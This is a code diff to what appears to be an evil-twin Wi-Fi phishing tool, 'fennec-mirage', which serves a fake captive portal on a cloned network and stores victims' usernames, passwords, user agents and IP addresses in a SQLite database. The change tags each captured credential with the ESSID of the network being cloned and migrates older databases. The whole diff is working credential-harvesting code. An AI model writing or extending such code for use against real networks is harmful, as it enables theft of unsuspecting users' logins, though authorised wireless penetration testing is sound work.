@@ -12,6 +12,16 @@ PORTAIL = "/opt/fennec-mirage/portal"
 BIND = "10.0.0.1"
 PORT = 80
 DB_PATH = "/opt/fennec-mirage/credentials.db"
+TARGET_FILE = "/tmp/fennec-mirage-target"
+
+
+def current_essid():
+    """ESSID of the network currently being cloned, to tag each capture with it."""
+    try:
+        with open(TARGET_FILE, encoding="utf-8") as f:
+            return f.readline().strip() or None
+    except OSError:
+        return None
 
 # Captive portal detection probes used by common operating systems.
 SONDES = {
@@ -32,9 +42,14 @@ def init_db():
             password TEXT,
             user_agent TEXT,
             ip_address TEXT,
-            portal_page TEXT
+            portal_page TEXT,
+            essid TEXT
         )
     ''')
+    # Older databases predate the essid column; add it if missing.
+    cols = [r[1] for r in cursor.execute("PRAGMA table_info(credentials)").fetchall()]
+    if "essid" not in cols:
+        cursor.execute("ALTER TABLE credentials ADD COLUMN essid TEXT")
     conn.commit()
     conn.close()
 
@@ -44,9 +59,9 @@ def save_credentials(username, password, user_agent, ip_address, portal_page):
         conn = sqlite3.connect(DB_PATH)
         cursor = conn.cursor()
         cursor.execute('''
-            INSERT INTO credentials (timestamp, username, password, user_agent, ip_address, portal_page)
-            VALUES (?, ?, ?, ?, ?, ?)
-        ''', (datetime.now().isoformat(), username, password, user_agent, ip_address, portal_page))
+            INSERT INTO credentials (timestamp, username, password, user_agent, ip_address, portal_page, essid)
+            VALUES (?, ?, ?, ?, ?, ?, ?)
+        ''', (datetime.now().isoformat(), username, password, user_agent, ip_address, portal_page, current_essid()))
         conn.commit()
         conn.close()
         return True
